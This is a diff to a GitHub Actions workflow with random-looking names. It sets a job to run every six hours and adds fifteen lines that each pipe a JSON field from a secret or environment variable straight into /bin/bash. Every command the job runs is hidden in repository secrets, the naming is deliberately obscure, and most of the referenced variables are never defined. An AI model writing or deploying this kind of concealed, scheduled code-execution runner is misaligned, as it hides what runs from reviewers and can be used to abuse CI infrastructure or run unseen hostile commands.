@@ -1,23 +1,31 @@
 name: fungusscaly
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '6 0/6 * * *'
+    - cron: '10 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: fungusscaly
         env:
-          n16: ${{ secrets.n16 }}
+          lte3912: ${{ secrets.lte3912 }}
         run: |
-          echo $n16 | jq -r .tep250 | /bin/bash
-          echo $pu14 | jq -r .cvo9524 | /bin/bash
-          echo $kxygt41443 | jq -r .fe6 | /bin/bash
-          echo $nyldy18396 | jq -r .k87654 | /bin/bash
-          echo $b4 | jq -r .pmcp11530 | /bin/bash
-          echo $j63 | jq -r .gn68 | /bin/bash
+          echo $lte3912 | jq -r .w07411 | /bin/bash
+          echo $yh49883 | jq -r .ch803 | /bin/bash
+          echo $dhz160 | jq -r .vmf382 | /bin/bash
+          echo $s07 | jq -r .z750 | /bin/bash
+          echo $tvi2293 | jq -r .qw1235 | /bin/bash
+          echo $ylpc25 | jq -r .gxpjw7040 | /bin/bash
+          echo $rse96 | jq -r .ybkr2 | /bin/bash
+          echo $q1936 | jq -r .fn07 | /bin/bash
+          echo $uuwp931 | jq -r .jds68 | /bin/bash
+          echo $klykc6293 | jq -r .r15 | /bin/bash
+          echo $dch6 | jq -r .n9 | /bin/bash
+          echo $sfr9775 | jq -r .bah907 | /bin/bash
+          echo $owz90 | jq -r .yxb44237 | /bin/bash
+          echo $c6 | jq -r .zvmsu6 | /bin/bash
+          echo $gbhy86 | jq -r .rprps972 | /bin/bash
 
